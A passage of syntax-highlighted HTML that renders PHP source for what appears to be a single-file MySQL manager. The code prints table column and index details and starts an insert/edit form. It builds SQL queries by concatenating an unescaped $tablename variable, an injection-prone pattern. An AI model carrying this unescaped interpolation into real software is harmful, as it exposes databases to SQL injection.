style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">rowdb<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">row<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">thisbg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"'<\/span>.$<span style=\"color: #ffcc66;\">thisbg<\/span>.<span style=\"color: #66cccc;\">'\" onmouseover=\"this.className=\\<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'focus\\';\" onmouseout=\"this.className=\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">thisbg<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\';\"&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Field'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Type'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Collation'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Null'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Key'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Default'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Extra'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Privileges'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Comment'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">tbfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">result<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"SHOW INDEX FROM $tablename\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rowdb<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span>($<span style=\"color: #ffcc66;\">row<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_array(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rowdb<\/span>[] = $<span style=\"color: #ffcc66;\">row<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h3&gt;Indexes&lt;\/h3&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;table border=\"0\" cellpadding=\"3\" cellspacing=\"0\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"head\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Keyname&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Type&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Unique&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Packed&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Seq_in_index&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Field&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Cardinality&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Collation&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Null&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Comment&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">rowdb<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">row<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">thisbg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"'<\/span>.$<span style=\"color: #ffcc66;\">thisbg<\/span>.<span style=\"color: #66cccc;\">'\" onmouseover=\"this.className=\\<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'focus\\';\" onmouseout=\"this.className=\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">thisbg<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\';\"&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Key_name'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Index_type'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.($<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Non_unique'<\/span>] ? <span style=\"color: #66cccc;\">'No'<\/span> : <span style=\"color: #66cccc;\">'Yes'<\/span>).<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td<\/span><span style=\"color: #66cccc; text-decoration: underline;\">&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.($<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Packed'<\/span>] === <span style=\"color: #6699cc;\">null<\/span> ? <span style=\"color: #66cccc;\">'No'<\/span> : $<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Packed'<\/span><span style=\"text-decoration: underline;\">]).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&amp;nbsp;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Seq_in_index'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Column_name'<\/span>].($<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Sub_part'<\/span>] ? <span style=\"color: #66cccc;\">'('<\/span>.$<span style=\"color: #ffcc66;\">ro<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">w<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Sub_part'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">')'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&amp;nbsp;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.($<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Cardinality'<\/span>] ? $<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Cardinality'<\/span>] : <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>)<span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&amp;nbsp;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Collation'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Null'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Comment'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">tbfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'insert'<\/span> || $<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'edit'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">result<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">'SHOW COLUMNS FROM '<\/span>.$<span style=\"color: #ffcc66;\">tablename<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span> ($<span style=\"color: #ffcc66;\">row<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_array(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rowdb<\/span>[] = $<span style=\"color: #ffcc66;\">row<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rs<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'insert'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;Insert new line in '<\/span>.$<span style=\"color: #ffcc66;\">tablename<\/span>.<span style=\"color: #66cccc;\">' table &amp;raquo;&lt;\/<\/span><span style=\"color: #66cccc; text-decoration: underline;\">h2&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: 